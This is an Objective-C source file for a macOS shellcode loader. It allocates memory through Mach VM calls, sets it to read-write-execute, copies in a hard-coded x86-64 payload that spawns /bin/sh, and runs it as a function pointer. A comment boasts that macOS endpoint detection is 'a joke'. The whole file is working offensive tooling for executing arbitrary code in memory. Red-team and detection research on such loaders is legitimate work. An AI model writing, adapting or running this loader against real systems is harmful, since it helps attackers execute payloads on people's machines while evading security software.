//
//  main.m
//  ObjCShellcodeLoader
//
//  Created by Justin Bui on 12/8/21.
//

#import <Foundation/Foundation.h>


int main(int argc, const char * argv[]) {
    
    // Maybe /bin/sh shellcode, maybe not, from https://github.com/theevilbit/shellcode
    UInt8 shellcode[] = {72, 49, 246, 86, 72, 191, 47, 47, 98, 105, 110, 47, 115, 104, 87, 72, 137, 231, 72, 49, 210, 72, 49, 192, 176, 2, 72, 193, 200, 40, 176, 59, 15, 5};
    unsigned long long shellcodeLength = (sizeof shellcode) / (sizeof shellcode[0]);
    
    // Allocate memory
    mach_vm_address_t address;
    kern_return_t kernReturn = mach_vm_allocate(mach_task_self(), &address, shellcodeLength, VM_FLAGS_ANYWHERE);
    
    if (kernReturn == KERN_SUCCESS) {
        printf("[+] mach_vm_allocate allocated memory!\n");
        printf("     |-> Address: %p\n", address);
    }
    else {
        printf("[-] mach_vm_allocate failed to allocate memory: %s\n", mach_error_string(kernReturn));
        exit(0);
    }
    
    // Change memory permissions to RWX because YOLO and macOS EDR is a joke
    kernReturn = mach_vm_protect(mach_task_self(), address, shellcodeLength, false, VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
    if (kernReturn == KERN_SUCCESS) {
        printf("[+] mach_vm_protect updated memory protections!\n");
        printf("     |-> Memory protection: 0x%02x\n", VM_PROT_READ | VM_PROT_WRITE | VM_PROT_EXECUTE);
    }
    else {
        printf("[-] mach_vm_protect failed to change memory permissions: %s\n", mach_error_string(kernReturn));
        exit(0);
    }
    
    // Write shellcode to allocated memory
    kernReturn = mach_vm_write(mach_task_self(), address, shellcode, shellcodeLength);
    if (kernReturn == KERN_SUCCESS) {
        printf("[+] mach_vm_write wrote to allocated memory!\n");
    }
    else {
        printf("[-] mach_vm_write failed to write shellcode: %s\n", mach_error_string(kernReturn));
        exit(0);
    }
    
    // Execute memory as a function pointer
    printf("[+] Executing function pointer!\n");
    printf("[+] Output:\n");
    void (*functionPointer)() = (void (*)())address;
    functionPointer();
    
    return 0;
}
